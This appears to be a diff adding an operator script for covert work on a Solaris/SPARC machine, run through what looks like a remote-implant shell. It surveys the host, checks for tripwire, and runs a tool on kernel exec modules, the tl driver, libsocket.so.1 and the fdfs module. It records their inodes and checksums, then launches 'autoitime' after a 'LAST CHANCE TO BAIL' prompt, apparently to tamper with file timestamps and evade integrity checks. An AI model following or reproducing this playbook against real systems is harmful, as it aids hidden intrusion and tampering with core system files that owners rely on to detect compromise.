@@ -1,0 +1,60 @@
+#NOGS
+
+uname -a
+psrinfo -v
+isainfo -kv
+-pause
+
+# make sure filesystem types are "ufs"
+df -n /kernel/drv /kernel/exec /platform /usr /usr/kernel
+-pause
+df -ak /usr/kernel /kernel/exec /platform /usr /usr/kernel
+-pause
+egrep '(kernel|usr|platform)' /etc/mnttab /etc/vfstab /etc/dfs/sharetab
+mount -p | egrep '(kernel|usr|platform)'
+-pause
+
+-gs tripwire
+-pause
+
+# itimehell begins
+-cmdout /current/down/itimehell
+
+# INC
+./it /kernel/exec
+./it /kernel/exec/intpexec
+./it /kernel/exec/sparcv9
+./it /kernel/exec/sparcv9/intpexec
+
+# RET
+./it /kernel/drv
+./it /kernel/drv/tl
+./it /kernel/drv/sparcv9
+./it /kernel/drv/sparcv9/tl
+
+# JL
+./it /usr/lib
+./it /usr/lib/sparcv9
+./it /usr/lib/libsocket.so.1
+./it /usr/lib/sparcv9/libsocket.so.1
+
+# OR
+./it /usr/kernel/fs
+./it /usr/kernel/fs/fdfs
+./it /usr/kernel/fs/sparcv9
+./it /usr/kernel/fs/sparcv9/fdfs
+./it /platform
+./it /platform/`uname -m`
+-cmdout
+-pause
+
+-lsh itflip /current/down/itimehell 
+
+sum /usr/kernel/fs/fdfs  /usr/kernel/fs/sparcv9/fdfs
+-ls -i /usr/kernel/fs/fdfs /usr/kernel/fs/sparcv9/fdfs /kernel/drv/tl /kernel/drv/sparcv9/tl /kernel/exec/intpexec /kernel/exec/sparcv9/intpexec /usr/lib/libsocket.so.1 /usr/lib/sparcv9/libsocket.so.1
+
+-beep 3
+###   LAST CHANCE TO BAIL. HIT ^C TO CUT BAIT, RETURN TO GO FISHIN   ###
+-pause
+###      "Let the Games Begin!"
+/current/etc/autoitime
